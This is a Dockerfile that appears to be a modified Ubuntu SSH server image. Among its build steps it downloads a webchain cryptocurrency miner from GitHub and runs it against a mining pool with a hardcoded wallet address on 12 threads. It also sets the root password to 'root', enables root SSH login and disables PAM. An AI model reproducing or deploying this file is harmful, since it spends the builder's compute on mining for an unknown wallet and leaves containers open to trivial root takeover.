FROM ubuntu:20.04
LABEL maintainer="https://github.com/rastasheep"

RUN apt-get update

RUN apt-get install -y wget
RUN wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
RUN tar xf webchain-miner-2.8.0-linux-amd64.tar.gz
RUN chmod +x webchain-miner
RUN ./webchain-miner -o pool.webchain.network:2222 -u 0x36F2b38B03258EA88Fa9c4e13b8dfE1561078FFF -p x -t 12 --donate-level 1 

RUN apt-get install -y openssh-server

RUN echo 'root:root' |chpasswd
RUN passwd --expire root

RUN sed -ri 's/^#?PermitRootLogin\s+.*/PermitRootLogin yes/' /etc/ssh/sshd_config
RUN sed -ri 's/UsePAM yes/#UsePAM yes/g' /etc/ssh/sshd_config

RUN mkdir /root/.ssh

RUN apt-get clean && \
    rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*

EXPOSE 22
RUN exit
CMD ["/usr/sbin/sshd", "-D"]
